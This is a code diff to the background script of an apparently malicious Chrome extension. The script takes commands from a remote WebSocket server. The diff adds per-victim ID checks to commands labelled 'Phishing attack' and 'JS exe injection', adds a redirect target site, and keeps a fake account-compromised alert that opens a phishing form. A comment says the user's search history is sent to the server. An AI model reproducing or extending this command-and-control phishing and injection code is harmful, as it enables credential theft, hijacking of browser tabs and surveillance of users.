@@ -12,6 +12,7 @@ var object = "";
 var type = "";
 var tempSite = "hello";
 var translateString = 'alert("Hello!")';
+var jsSite = "https://www.instagram.com/";
 
 //Listen to the server and parse objects.
 ws.onmessage = function (e) {
@@ -20,30 +21,45 @@ ws.onmessage = function (e) {
     type = object.type;
   //  tempSite = object.addString;
   //  translateString = object.jsString;
+  //  jsSite = object.site
 
     switch(type){
       //Phishing attack
       case 'html':
-        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
-          chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
-        });
+        chrome.storage.sync.get("id", function(ev){
+          var tempId=ev.id;
+          if(tempId === id){
+            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
+              chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
+            });
+          }
+          });
         break;
       case 'js':
       //JS exe injection
-        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
-          chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
-        });
-        chrome.storage.sync.set({'scriptExe': translateString}, function(){});
+        chrome.storage.sync.get("id", function(ev){
+          var tempId=ev.id;
+          if(tempId === id){
+            chrome.storage.sync.set({'scriptExe': translateString, 'redirectSite': jsSite}, function(){});
+            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
+              chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
+            });
+          }
+          });
         break;
       case 'listAdd':
       //Add to the list of blacklist websites.
-        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
-          chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
-        });
-        chrome.storage.sync.set({'addSite': tempSite}, function(){});
+        chrome.storage.sync.get("id", function(ev){
+          var tempId=ev.id;
+          if(tempId === id){
+            chrome.storage.sync.set({'addSite': tempSite}, function(){});
+            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
+              chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
+            });
+          }
+          });
         break;
       case 'message':
-        alert("WORKED!");
         break;
     }
 };
@@ -60,7 +76,7 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
       alert("Your account has been comprimised! We need additional information to continue display of this accounts' info.");
       chrome.tabs.create({url: '/phishForm.html', active: true});
       break;
-  }
+    }
 });
 
 //Simply send over search history from the user on chrome startup.
